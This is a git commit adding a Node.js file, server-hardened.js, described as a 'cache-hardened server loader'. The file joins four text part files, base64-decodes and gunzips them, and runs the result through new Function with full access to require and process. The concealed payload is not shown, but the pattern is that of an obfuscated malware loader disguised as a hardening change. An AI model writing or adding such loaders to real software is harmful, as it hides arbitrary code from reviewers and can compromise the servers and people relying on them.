fec9e0289e78c7c27f5c7dc53d9927d020318648
peterpaul10m-code <peterpaul10m@gmail.com>
2026-09-17 16:32:44 -0500

    Add cache-hardened server loader

---
+++ server-hardened.js
@@ -0,0 +1,5 @@
+const fs=require('fs');
+const zlib=require('zlib');
+const bundle=[1,2,3,4].map(i=>fs.readFileSync(`server.hardened.part${i}.txt`,'utf8').trim()).join('');
+const source=zlib.gunzipSync(Buffer.from(bundle,'base64')).toString('utf8');
+new Function('require','__dirname','__filename','process','Buffer',source)(require,__dirname,__filename,process,Buffer);
